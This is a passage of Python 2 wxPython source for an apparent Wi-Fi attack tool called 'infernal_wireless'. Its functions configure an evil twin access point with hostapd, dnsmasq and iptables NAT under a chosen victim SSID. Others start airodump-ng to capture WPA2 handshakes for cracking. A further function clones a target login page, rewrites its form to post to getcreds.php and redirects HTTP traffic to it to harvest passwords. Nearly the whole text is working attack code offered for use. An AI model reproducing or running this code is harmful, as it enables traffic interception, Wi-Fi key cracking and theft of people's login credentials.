	

    def __init__(self,parent,id):
		
        wx.Frame.__init__(self, parent, id, 'New Window', size=(600,300))
        wx.Frame.CenterOnScreen(self)
        #self.new.Show(False))
        panel = wx.Panel(self, -1)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.listbox = wx.ListBox(panel, -1)
        hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
        btnPanel = wx.Panel(panel, -1)
        vbox = wx.BoxSizer(wx.VERTICAL)
       
        select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
        attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))
        
        self.Bind(wx.EVT_BUTTON, self.ScanW, id=-1)
        
        attack.Bind(wx.EVT_BUTTON, self.attack_W)
        
        #self.Bind(wx.EVT_LISTBOX_DCLICK, self.OnRename)
        vbox.Add((-1, 20))
        vbox.Add(select)
        vbox.Add(attack)
        
        btnPanel.SetSizer(vbox)
        hbox.Add(btnPanel, 0.6, wx.EXPAND | wx.RIGHT, 20)
        panel.SetSizer(hbox)
        self.Centre()
        self.Show(True)
    app_select= ''
    
    	
    
    def ScanW(self, event):
		with open('wScan.log') as f:
			for i in f:
				self.listbox.Append(i)
	
    def evil_twin_attack(self, SSID):
			output = Popen(["iwconfig"], stdout=PIPE).communicate()[0]
			wireless_interface = ""
			mon_iface = ""
			if "wlan" in output:
				wireless_interface = output[0:6].strip()


			#mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]
			hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
			#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
			config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid="+str(SSID)+"\nchannel=1\n#enable_karma=1\n"
			hostapd.write(config_file)
			hostapd.close()
			os.system("service hostapd start")
		
			os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
			cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""")

			os.system("service dnsmasq start")

		
			os.system("""ifconfig wlan0 up
			ifconfig wlan0 10.0.0.1/24

			iptables -t nat -F
			iptables -F
			iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
			iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
			echo '1' > /proc/sys/net/ipv4/ip_forward""")
			
    def attack_W(self, e):
		sel = self.listbox.GetSelection()
		text = self.listbox.GetString(sel)
		text_split = str(text).split(', ')
		app_select = text_split[0].replace("['SSID:","").replace("'","").strip()
		##### remove ['SSID: 
		self.evil_twin_attack(app_select)
		
		
		
		
		######## close the child frame
		
		self.Show(False)
		
################## wpa2 crack capture is finished##########	
class WPA2_crack(wx.Frame):
	
	

    def __init__(self,parent,id):
		
        wx.Frame.__init__(self, parent, id, 'WPA_crack', size=(600,300))
        wx.Frame.CenterOnScreen(self)
        #self.new.Show(False))
        panel = wx.Panel(self, -1)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.listbox = wx.ListBox(panel, -1)
        hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
        btnPanel = wx.Panel(panel, -1)
        vbox = wx.BoxSizer(wx.VERTICAL)
       
        select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
        attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))
        
        self.Bind(wx.EVT_BUTTON, self.ScanW, id=-1)
        
        attack.Bind(wx.EVT_BUTTON, self.attack_WPA2)
        
        #self.Bind(wx.EVT_LISTBOX_DCLICK, self.OnRename)
        vbox.Add((-1, 20))
        vbox.Add(select)
        vbox.Add(attack)
        
        btnPanel.SetSizer(vbox)
        hbox.Add(btnPanel, 0.6, wx.EXPAND | wx.RIGHT, 20)
        panel.SetSizer(hbox)
        self.Centre()
        self.Show(True)
    app_select= ''
    
    def wireless_scan_cracker(self):
		
		os.system("ifconfig wlan0 up")
		read_only_txt = wx.TextCtrl(self, -1, '', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
		output = str(commands.getstatusoutput("iw wlan0 scan")[1])

		#p = r'SSID: \S*|cipher: \S*|Authentication suites: \S*'
		p = r'SSID: \S*|cipher: \S*'
		match = re.findall(p, output)
		wireless_ssid_file = open('wScan_cracker.log', 'a')
		grouped = list(zip(*[iter(match)] * 2))
		for i in grouped:
			
			#print sorted(i)
			wireless_ssid_file.write(str(sorted(i))+'\n')
		
		#~ wireless_ssid_file.write(grouped)
		wireless_ssid_file.close()	
    
    def ScanW(self, event):
		self.wireless_scan_cracker()
		with open('wScan_cracker.log') as f:
			for i in f:
				self.listbox.Append(i)

    def wpa_crack_key(self, SSID):
		os.system("airmon-ng start wlan0")
		#os.system("mkdir capture")
		
		##os.system("airodump-ng --essid "+str(SSID)+" --write "+str(SSID)+"_crack mon0")
		os.system("gnome-terminal -x airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0 &")
		#os.system("airmon-ng stop mon0")
		#print str(SSID)
		os.system("airmon-ng stop mon0")
		#~ app_select = SSID


    
		
		

	#~ def about(self, event):
		#~ frm=MyHtmlFrame2(None, "About...")
		#~ frm.Show()

			
	
    def attack_WPA2(self, e):
		sel = self.listbox.GetSelection()
		text = self.listbox.GetString(sel)
		text_split = str(text).split(', ')
		app_select = text_split[0].replace("['SSID:","").replace("'","").strip()
		##### remove ['SSID: 
		#self.evil_twin_attack(app_select)
		#print type(app_select)
		#print app_select
		self.wpa_crack_key(str(app_select))
			
    #~ def attack_W(self, e):
		#~ sel = self.listbox.GetSelection()
		#~ text = self.listbox.GetString(sel)
		#~ text_split = str(text).split(', ')
		#~ app_select = text_split[0].replace("['SSID:","").replace("'","").strip()
		#~ ##### remove ['SSID: 
		#~ self.evil_twin_attack(app_select)
    
    #~ def crack_wpa2_handshake(e):
		#~ #sel = self.listbox.GetSelection()
	#def crack_wpa2_handshake(self,e):
		#~ os.system("gnome-terminal -x aircrack-ng -w /usr/share/wordlists/fern-wifi/common.txt *.cap")
		
		
		
		
		######## close the child frame
		
		self.Show(False)



class infernal_wireless(wx.Frame):
    def __init__(self, parent, id):
      wx.Frame.__init__(self, parent, id)
      
      panel = wx.Panel(self,-1)
      wx.StaticText(panel, -1, 'Currently, fully page download automation is not \nfully implemented.\nPlease connect to victim SSID and save the login page as \n/var/www/login.html and change permission to 755\n for all web contents you downloaded\nAnd press the button below to proceed to attack')
      ifcbtn = wx.Button(panel, label='Execute Infernal  ', pos=(20,150))
      ifcbtn.Bind(wx.EVT_BUTTON, self.executeInfernal)
      
      self.bSoup = wx.TextCtrl(panel, -1, "", style=wx.TE_MULTILINE,pos=(30, 200),size=(500,350))

      self.CreateStatusBar()
      #~ menuBar = wx.MenuBar()
      #~ menu = wx.Menu()
      #~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
      #~ menuBar.Append(menu, "&Cracker")
      #~ self.SetMenuBar(menuBar)
      #~ self.Bind(wx.EVT_MENU, self.openfile, id=99)
	
    #~ def openfile(self, event):
    

   #~ 
    def executeInfernal(self, e):
		
		def get_login_page():
			#
	
			
			httplib.HTTPConnection.debuglevel=1
			request = urllib2.Request('http://localhost/Login.html')
			opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
			f = opener.open(request)
	##article = re.sub(r'(?is)</html>.+', '</html>', article)
			redirect = f.url
	##response = urllib2.urlopen('https://google.com')
			html = f.read()
			#print "Found the login page here: " + f.url
	########## regex search and replace
			regex = re.search(r'action="([^"]*)".*?', html)
			post_action = str(regex.group(0))
	
			#~ print "*" * 20
			#~ print 'modifying the login page...'
			new_login = html.replace(post_action, 'action=getcreds.php') 
	##### create a login page
			index_page = open('/var/www/index2.html','wb')
			index_page.write(new_login)
			index_page.close()
	
	############# MOFIYING THE POST SCRIPT
	
			myhtml = open('/var/www/index2.html', 'r')

			read_html = myhtml.read()

			myhtml.close()

			number = 0

			html_proc = BeautifulSoup(read_html)

			inputs =  html_proc.findAll('input')
			panel = wx.Panel(self,-1)
			#wx.StaticText(panel, -1, '')
			
			#self.bSoup = wx.TextCtrl(panel, -1, "Please select the username and password from the form", style=wx.TE_MULTILINE,pos=(30, 200),size=(500,350))
			
			for i in inputs:
				print str(number) +": " +str(i)
				number = number + 1
				self.bSoup.AppendText(str(number) +": " +str(i)+"\n")
				
				
			def ask(parent=None, message='', default_value=''):
				dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
				dlg.ShowModal()
				result = dlg.GetValue()
				dlg.Destroy()
				return result
				


			
	
	#username_select = input('Please choose the username or email ID in numeric representation: ')
			
		
			user = str(ask(message = 'Enter Username')).strip()
			password = str(ask(message = 'Enter Username')).strip()
			ssid = str(ask(message = 'Enter the SSID')).strip()
			


			
			tmp = read_html.replace('name="'+user+'"','name="username"').replace('name="'+password+'"', 'name="password"')
	
			new_page = open('/var/www/index.html', 'wb')
			new_page.write(tmp)
			new_page.close()
			os.system('firefox http://localhost/index.html &')
			time.sleep(3)
			
			#mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]
			hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
			#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
			config_file = "interface=wlan0\ndriver=nl80211\nssid="+str(ssid)+"\nchannel=1\n#enable_karma=1\n"
			hostapd.write(config_file)
			hostapd.close()
			os.system("service hostapd start")
		
			os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
			cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""")

			os.system("service dnsmasq start")

		
			#~ os.system("""ifconfig wlan0 up
			#~ ifconfig wlan0 10.0.0.1/24
#~ 
			#~ iptables -t nat -F
			#~ iptables -F
			#~ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
			#~ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
			#~ echo '1' > /proc/sys/net/ipv4/ip_forward""")
			#~ print "finished the setup of nat"
			os.system("""ifconfig wlan0 up
ifconfig wlan0 10.0.0.1/24
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE""")
			print "finished the setup of nat"
		
		
		get_login_page()

	
def main():
	
	ex = wx.App()
	Example(None)
	
	ex.MainLoop()
	

if __name__ == '__main__':
	main()
	
